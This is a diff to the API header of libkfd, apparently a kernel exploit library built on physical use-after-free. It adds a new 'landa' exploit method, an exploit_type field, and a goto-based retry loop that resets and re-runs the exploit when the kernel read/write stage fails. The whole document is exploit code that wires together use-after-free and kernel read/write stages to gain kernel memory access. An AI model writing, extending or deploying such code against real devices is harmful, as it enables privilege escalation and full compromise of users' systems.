@@ -13,7 +13,6 @@
 #define CONFIG_TIMER 1
 
 #include "libkfd/common.h"
-#include "fun.h"
 
 /*
  * The public API of libkfd.
@@ -22,6 +21,7 @@
 enum puaf_method {
     puaf_physpuppet,
     puaf_smith,
+    puaf_landa,
 };
 
 enum kread_method {
@@ -55,6 +55,7 @@ struct info {
         i32 pid;
         u64 tid;
         u64 vid;
+        u64 exploit_type;
         u64 maxfilesperproc;
         char kern_version[512];
     } env;
@@ -151,6 +152,8 @@ struct kfd {
 struct kfd* kfd_init(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
 {
     struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
+    kfd->info.env.exploit_type = puaf_method;
+    
     info_init(kfd);
     puaf_init(kfd, puaf_pages, puaf_method);
     krkw_init(kfd, kread_method, kwrite_method);
@@ -170,18 +173,33 @@ void kfd_free(struct kfd* kfd)
 u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
 {
     timer_start();
+    
+    bool fail = false;
 
     const u64 puaf_pages_min = 16;
     const u64 puaf_pages_max = 2048;
     assert(puaf_pages >= puaf_pages_min);
     assert(puaf_pages <= puaf_pages_max);
-    assert(puaf_method <= puaf_smith);
+    assert(puaf_method <= puaf_landa);
     assert(kread_method <= kread_sem_open);
     assert(kwrite_method <= kwrite_sem_open);
 
     struct kfd* kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
+
+retry:
     puaf_run(kfd);
-    krkw_run(kfd);
+    fail = krkw_run(kfd);
+    if(fail && (kfd->info.env.exploit_type == 2)) {
+        puaf_free(kfd);
+        info_free(kfd);
+        bzero(kfd, sizeof(struct kfd));
+        info_init(kfd);
+        puaf_init(kfd, puaf_pages, puaf_method);
+        krkw_init(kfd, kread_method, kwrite_method);
+        perf_init(kfd);
+        goto retry;
+    }
+    
     info_run(kfd);
     perf_run(kfd);
     puaf_cleanup(kfd);
